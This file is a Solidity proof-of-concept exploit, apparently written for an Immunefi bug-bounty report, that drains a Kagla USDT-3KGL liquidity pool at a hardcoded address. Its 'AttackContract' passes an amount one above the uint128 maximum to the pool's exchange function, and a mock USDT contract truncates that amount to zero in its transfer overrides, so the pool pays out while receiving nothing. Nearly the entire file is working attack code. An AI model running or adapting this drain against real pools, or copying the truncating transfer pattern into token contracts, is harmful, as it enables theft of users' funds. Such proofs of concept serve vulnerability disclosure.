// SPDX-License-Identifier: UNLICENSED
pragma solidity >0.8.20;
pragma experimental ABIEncoderV2;

import "@immunefi/PoC.sol";
import "forge-std/interfaces/IERC20.sol";
import "./external/IPool.sol";

import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract AttackContract is PoC {
    USDT usdt;
    IERC20[] tokens = new IERC20[](2);
    IPool kaglaPool = IPool(0xDc1C5bAbB4dad3117Fd46d542f3b356D171417fA);

    function initiateAttack() public {
        usdt = USDT(0xfFFfffFF000000000000000000000001000007C0);
        usdt.mint(address(kaglaPool), 267994933776);

        tokens[0] = IERC20(kaglaPool.coins(0));
        tokens[1] = IERC20(kaglaPool.coins(1));

        setAlias(address(kaglaPool), "Kagla Pool");
        setAlias(address(this), "AttackContract");

        console.log("Draining the Kagla USDT-3KGL pool");
        console.log("pool.coins(0): %s", kaglaPool.coins(0));
        console.log("pool.coins(1): %s", kaglaPool.coins(1));

        snapshotAndPrint(address(kaglaPool), tokens);
        snapshotAndPrint(address(this), tokens);

        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("Draining pool now...");

        // def exchange(i: int128, j: int128, dx: uint256, min_dy: uint256)
        uint256 truncatedAmount = uint256(type(uint128).max) + 1;
        kaglaPool.exchange(0, 1, truncatedAmount, 0);

        _completeAttack();
    }
    
    function _completeAttack() internal {
        snapshotAndPrint(address(kaglaPool), tokens);
        snapshotAndPrint(address(this), tokens);
    }
}

contract USDT is ERC20 {
    constructor() ERC20("Tether USD", "USDT") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint128 a = uint128(amount);
        return super.transferFrom(sender, recipient, uint256(a));
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint128 a = uint128(amount);
        return super.transfer(recipient, uint256(a));
    }

    function mint(address recipient, uint256 amount) public {
        _mint(recipient, amount);
    }
}
